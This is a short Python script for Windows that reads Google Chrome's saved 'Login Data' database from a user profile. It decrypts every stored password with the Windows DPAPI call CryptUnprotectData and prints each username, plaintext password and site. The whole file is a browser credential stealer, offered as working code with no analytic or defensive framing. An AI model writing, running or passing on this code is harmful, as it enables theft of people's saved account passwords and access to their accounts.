#coding:utf-8
import os, sys
import sqlite3
import win32crypt
google_path = r'C:\Users\liton\AppData\Local\Google\Chrome\User Data\Default\Login Data'
db_file_path =os.path.join(os.environ['LOCALAPPDATA'],google_path)
conn = sqlite3.connect(db_file_path)
cursor = conn.cursor()
cursor.execute('select username_value,password_value, signon_realm from logins')
#接收全部返回结果
for data in cursor.fetchall():
	passwd = win32crypt.CryptUnprotectData(data[1],None,None,None,0)
	if passwd:
		print ('-------------------------')
		print(data[0])
		print(passwd[1])
		print(data[2])

